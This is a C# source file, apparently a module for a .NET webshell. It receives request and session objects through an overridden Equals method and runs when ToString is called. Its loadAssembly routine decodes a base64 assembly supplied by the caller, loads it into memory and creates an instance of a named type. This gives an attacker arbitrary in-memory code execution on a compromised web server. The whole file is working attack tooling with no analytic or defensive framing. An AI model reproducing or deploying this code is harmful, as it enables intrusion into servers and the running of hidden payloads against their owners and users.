using System;
using System.Collections;
using System.Reflection;
using System.Text;
using System.Web;

namespace AssemblyLoad
{
    public class Run
    {
        private HttpRequest httpRequest;
        private HttpResponse httpResponse;
        private Hashtable parameters;
        private Hashtable sessionTable;

        private string run()
        {
            return loadAssembly();
        }

        private string loadAssembly()
        {
            try
            {
                String assemblyFileBase64 = get("assemblyFileBase64");
                String instanceName = get("instanceName");
                byte[] assemblyBytes = Convert.FromBase64String(assemblyFileBase64);
                Assembly assembly = Assembly.Load(assemblyBytes);
                assembly.CreateInstance(instanceName);
            }
            catch (Exception e)
            {
                return e.Message;
            }
            return "1";
        }

        public override string ToString()
        {
            if (this.parameters == null)
                return string.Format("{0} The initialization parameter procedure failed!", (object) this.GetType().FullName);
            try
            {
                this.parameters.Add((object) "result", (object) this.stringToByteArray(this.run()));
            }
            finally
            {
                this.parameters = (Hashtable) null;
                this.httpRequest = (HttpRequest) null;
                this.httpResponse = (HttpResponse) null;
                this.sessionTable = (Hashtable) null;
            }
            return "";
        }

        public override bool Equals(object obj)
        {
            bool flag = false;
            try
            {
                if (typeof(Hashtable).IsAssignableFrom(obj.GetType()))
                {
                    parameters = (Hashtable)obj;
                    sessionTable = (Hashtable)parameters["sessionTable"];
                    httpRequest = (HttpRequest)parameters["request"];
                    httpResponse = (HttpResponse)parameters["response"];
                    return true;
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }

            return flag;
        }

        public string get(string keyName)
        {
            string str = (string) null;
            try
            {
                str = this.byteArrayTostring(this.getByteArray(keyName));
            }
            catch (Exception ex)
            {
            }
            return str;
        }
        public byte[] getByteArray(string keyName)
        {
            byte[] byteArray = (byte[]) null;
            try
            {
                byteArray = (byte[]) this.parameters[(object) keyName];
            }
            catch (Exception ex)
            {
            }
            return byteArray;
        }
        public byte[] stringToByteArray(string data) => Encoding.Default.GetBytes(data);

        public string byteArrayTostring(byte[] data) => Encoding.Default.GetString(data);

        public string base64Encode(string data) => this.base64Encode(this.stringToByteArray(data));

        public string base64Encode(byte[] data) => Convert.ToBase64String(data);
    }
}